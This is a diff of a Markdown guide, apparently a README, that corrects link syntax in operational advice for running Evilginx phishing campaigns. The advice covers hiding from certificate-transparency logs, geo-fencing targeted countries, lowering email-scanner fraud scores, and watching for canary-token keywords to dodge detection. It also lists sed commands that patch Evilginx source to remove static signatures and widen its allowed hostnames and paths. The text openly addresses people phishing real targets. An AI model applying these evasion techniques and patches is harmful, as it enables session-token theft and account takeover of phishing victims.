@@ -8,21 +8,21 @@
 
 ➺ BUYING EXPIRED DOMAINS DOES NOT WORK ANYMORE!
 
-➺ DO NOT use `autocert: on`, you are gonna appear on a lot of public CT records, use [CloudFlare origin certificate]([url](https://developers.cloudflare.com/ssl/origin-configuration/origin-ca/)) instead, ([no]([url](https://breakdev.org/evilginx-3-3-go-phish/)) [need]([url](https://x.com/mrgretzky/status/1763584080245887320?lang=en)) [to modify]([url](https://github.com/kgretzky/evilginx2/commit/3b0f5c9971bf1041acc88d1b6ffcb9a5203f261c#diff-ecec88c33adb7591ee6aa88e29b62ad52ef443611cba5e0f0ecac9b5725afdbaR2)) [source]([url](https://www.youtube.com/watch?v=zp3u3xSuCpQ&t=254s)), evilginx [supports]([url](https://www.youtube.com/watch?v=Rz3tvy0455M)) it [by default]([url](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)))!.
+➺ DO NOT use `autocert: on`, you are gonna appear on a lot of public CT records, use [CloudFlare origin certificate](https://developers.cloudflare.com/ssl/origin-configuration/origin-ca/) instead, ([no](https://breakdev.org/evilginx-3-3-go-phish/) [need](https://x.com/mrgretzky/status/1763584080245887320?lang=en) [to modify](https://github.com/kgretzky/evilginx2/commit/3b0f5c9971bf1041acc88d1b6ffcb9a5203f261c#diff-ecec88c33adb7591ee6aa88e29b62ad52ef443611cba5e0f0ecac9b5725afdbaR2) [source](https://www.youtube.com/watch?v=zp3u3xSuCpQ&t=254s), evilginx [supports](https://www.youtube.com/watch?v=Rz3tvy0455M) it [by default](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)!.
 
-➺ Remember to change CloudFlare's mode to [Full]([url](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full/)) (Not [Full Strict]([url](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full-strict/))).
+➺ Remember to change CloudFlare's mode to [Full](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full/) (Not [Full Strict](https://developers.cloudflare.com/ssl/origin-configuration/ssl-modes/full-strict/).
 
-➺ If you are phishing people from a specific country, [configure Cloudflare]([url](https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-specific-countries/)) to present I'm under attack mode if an IP out of your country hits your site.
+➺ If you are phishing people from a specific country, [configure Cloudflare](https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-specific-countries/) to present I'm under attack mode if an IP out of your country hits your site.
 
-➺ Enable [BotFight mode]([url]([https://developers.cloudflare.com/bots/get-started/bot-fight-mode/](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#enable-bot-fight-mode))) and [AI Bots Fight mode]([url](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#block-ai-bots)) on CloudFlare.
+➺ Enable [BotFight mode](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#enable-bot-fight-mode) and [AI Bots Fight mode](https://developers.cloudflare.com/bots/get-started/bot-fight-mode/#block-ai-bots) on CloudFlare.
 
-➺ I recommend having real content on 'www' pointing to your A record as adviced [here]([url](https://github.com/aalex954/evilginx2-TTPs?tab=readme-ov-file#site-classification)).
+➺ I recommend having real content on 'www' pointing to your A record as adviced [here](https://github.com/aalex954/evilginx2-TTPs?tab=readme-ov-file#site-classification).
 
-➺ Remember that `key: ''` parameter is not valid when capturing `json` tokens, [see documentation]([url](https://help.evilginx.com/community/phishlet-format#json-example)).
+➺ Remember that `key: ''` parameter is not valid when capturing `json` tokens, [see documentation](https://help.evilginx.com/community/phishlet-format#json-example).
 
 ➺ Using a CDN for email sendouts will significantly reduce email scanner detection!.
 
-➺ [OpenGraph]([url](https://help.evilginx.com/community/guides/lures#opengraph)) makes phishing more credible, an email with embedded images increases its fraudscore... Instead you can use opengraph, reduce fraudscore and make it more believable, be creative.
+➺ [OpenGraph](https://help.evilginx.com/community/guides/lures#opengraph) makes phishing more credible, an email with embedded images increases its fraudscore... Instead you can use opengraph, reduce fraudscore and make it more believable, be creative.
 
 ➺ Emails with URLs embedded in words also increase fraudscore!.
 
@@ -48,7 +48,7 @@
 
 ➺ if you already have `auto_filter: true`, it's not necessary to rewrite hostnames with subfilters, unless they look like `<legitsite>.com` or `legitsite\.com` (with hardcoded literal backslash)
 
-**These are some keywords related to [Canary]([url](https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/)) [Tokens]([url](https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05)) and [Redirection]([url](https://www.obsidiansecurity.com/blog/demystifying-okta-aitm)) [Urls]([url](https://www.riskinsight-wavestone.com/en/2025/07/phishing-pushing-evilginx-to-its-limit/)) you should look out for:**
+**These are some keywords related to [Canary](https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/) [Tokens](https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05) and [Redirection](https://www.obsidiansecurity.com/blog/demystifying-okta-aitm) [Urls](https://www.riskinsight-wavestone.com/en/2025/07/phishing-pushing-evilginx-to-its-limit/) you should look out for:**
 
 ```
 redirect_uri
@@ -96,7 +96,7 @@ Or any shit that conventional people with zero self-questioning would fall for, 
 
 **This is a list of sed -i commands that aim to modify Evilginx source (use it in the following order):**
 
-**[Remove deprecated io/ioutil]([url](https://github.com/kgretzky/evilginx2/pull/1050))**
+**[Remove deprecated io/ioutil](https://github.com/kgretzky/evilginx2/pull/1050)**
 
 ```
 sed -i '/io\/ioutil/d' evilginx2/core/certdb.go
@@ -133,7 +133,7 @@ D
 sed -i 's/|yu|za|zm|zw/|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store/' evilginx2/core/http_proxy.go
 ```
 
-**Remove [static signatures]([url](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup/blob/main/README.md?plain=1#L188)) from unauth_redirect, add Headers security headers for unauth_redirect and base64 encode the unauth_redirect logic**
+**Remove [static signatures](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup/blob/main/README.md?plain=1#L188) from unauth_redirect, add Headers security headers for unauth_redirect and base64 encode the unauth_redirect logic**
 
 ```
 sed -i '1311a\ resp.Header.Set("Referrer-Policy", "no-referrer")\n resp.Header.Set("Cache-Control", "no-store")\n resp.Header.Set("X-Content-Type-Options", "nosniff")\n resp.Header.Set("X-Frame-Options", "DENY")\n resp.Header.Set("Content-Security-Policy", "default-src 'none'; script-src 'unsafe-eval' 'self'")' evilginx2/core/http_proxy.go
@@ -141,7 +141,7 @@ sed -i "s|body := fmt.Sprintf(\"<html><head><meta name='referrer' content='no-re
 sed -i 's|fmt\.Sprintf("top\.location\.href='\''%s'\'';", rurl)|fmt.Sprintf("top.location.href=%s;", strconv.Quote(rurl))|g' evilginx2/core/http_proxy.go
 ```
 
-**[Allow path regex and block headers]([url](https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/README.md?plain=1#L41))**
+**[Allow path regex and block headers](https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/README.md?plain=1#L41)**
 
 ```
 sed -i 's/regexp\.Compile("\^" + d + "\$")/regexp.Compile(d)/' evilginx2/core/phishlet.go
@@ -170,19 +170,19 @@ sed -i 's_proxyHeaders := \[\]string{\"_&CF-Connecting-IP\", \"_' evilginx2/core
 
 **Optionally, add these functionalities (very useful):**
 
-You can also modify source (not included here) in order to inject the latest generated tokens to chromium (chromium will use the same proxy configured for Evilginx), see it [here]([url](https://github.com/kgretzky/evilginx2/pull/1189)).
+You can also modify source (not included here) in order to inject the latest generated tokens to chromium (chromium will use the same proxy configured for Evilginx), see it [here](https://github.com/kgretzky/evilginx2/pull/1189).
 
-You can also modify source (not included here) in order to allow [Header Overwriting]([url](https://github.com/kgretzky/evilginx2/pull/1006))
+You can also modify source (not included here) in order to allow [Header Overwriting](https://github.com/kgretzky/evilginx2/pull/1006)
 
-You can also modify source (not included here) in order to allow [Force Get]([url](https://github.com/kgretzky/evilginx2/pull/1163))
+You can also modify source (not included here) in order to allow [Force Get](https://github.com/kgretzky/evilginx2/pull/1163)
 
 ---
 
 **When configuring a proxy for evilginx:**
 
-To [configure a proxy for evilginx]([url](https://help.evilginx.com/community/guides/proxy)) type: `help proxy`
+To [configure a proxy for evilginx](https://help.evilginx.com/community/guides/proxy) type: `help proxy`
 
-**[Low fraud score is not bullshit]([url](https://www.blackhatworld.com/seo/low-fraud-score-proxies.1490657/post-16304635)).**
+**[Low fraud score is not bullshit](https://www.blackhatworld.com/seo/low-fraud-score-proxies.1490657/post-16304635).**
 
 But when most people say “low fraud score” they mean to say “Google reCAPTCHA score”.
 
@@ -190,9 +190,9 @@ Do you want to test a proxy to see if it is as clean as possible?
 
 First of all check the proxy here for any blacklists:
 
-[WhatIsMyIPAddress.com]([url](https://whatismyipaddress.com/blacklist-check))
+[WhatIsMyIPAddress.com](https://whatismyipaddress.com/blacklist-check)
 
-Second, connect to your proxy and go to this site [recaptcha-demo.appspot.com]([url](https://recaptcha-demo.appspot.com/)) → Request Scores
+Second, connect to your proxy and go to this site [recaptcha-demo.appspot.com](https://recaptcha-demo.appspot.com/) → Request Scores
 
 This is reCaptcha v3 and it will detect if a user is bot like or not then it will rate it out of 1.0.
 
